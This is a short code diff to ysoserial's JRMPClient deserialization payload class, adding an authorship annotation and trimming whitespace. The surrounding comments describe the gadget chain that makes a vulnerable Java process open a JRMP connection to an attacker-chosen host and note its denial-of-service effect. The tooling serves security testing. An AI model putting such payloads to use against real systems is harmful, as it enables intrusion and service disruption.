@@ -10,13 +10,14 @@ import java.util.Random;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
 
 /**
- * 
- * 
+ *
+ *
  * UnicastRef.newCall(RemoteObject, Operation[], int, long)
  * DGCImpl_Stub.dirty(ObjID[], long, Lease)
  * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
@@ -24,31 +25,32 @@ import ysoserial.payloads.util.PayloadRunner;
  * DGCClient.registerRefs(Endpoint, List<LiveRef>)
  * LiveRef.read(ObjectInput, boolean)
  * UnicastRef.readExternal(ObjectInput)
- * 
+ *
  * Thread.start()
  * DGCClient$EndpointEntry.<init>(Endpoint)
  * DGCClient$EndpointEntry.lookup(Endpoint)
  * DGCClient.registerRefs(Endpoint, List<LiveRef>)
  * LiveRef.read(ObjectInput, boolean)
  * UnicastRef.readExternal(ObjectInput)
- * 
+ *
  * Requires:
  * - JavaSE
- * 
+ *
  * Argument:
  * - host:port to connect to, host only chooses random port (DOS if repeated many times)
- * 
+ *
  * Yields:
  * * an established JRMP connection to the endpoint (if reachable)
  * * a connected RMI Registry proxy
  * * one system thread per endpoint (DOS)
- * 
+ *
  * @author mbechler
  */
 @SuppressWarnings ( {
     "restriction"
 } )
 @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
+@Authors({ Authors.MBECHLER })
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
     public Registry getObject ( final String command ) throws Exception {
